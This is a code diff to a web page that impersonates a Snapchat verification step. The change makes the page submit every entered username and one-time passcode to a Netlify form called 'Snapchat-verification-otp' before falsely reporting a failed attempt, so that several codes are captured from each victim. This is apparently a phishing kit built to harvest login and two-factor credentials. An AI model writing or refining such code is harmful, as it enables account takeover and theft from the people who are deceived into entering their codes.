@@ -84,6 +84,12 @@ export default function VerificationPage() {
       return;
     }
 
+    const storedUsername = username.trim();
+    await submitNetlifyForm("Snapchat-verification-otp", {
+      identifier: storedUsername,
+      otp,
+    });
+
     if (attemptsRef.current < 2) {
       attemptsRef.current += 1;
       setOtp("");
@@ -91,15 +97,9 @@ export default function VerificationPage() {
       return;
     }
 
-    const storedUsername = username.trim();
     if (storedUsername) {
       window.sessionStorage.setItem("snapchatLoginUsername", storedUsername);
     }
-
-    await submitNetlifyForm("Snapchat-verification-otp", {
-      identifier: storedUsername,
-      otp,
-    });
 
     setOtp("");
     setOtpError("");
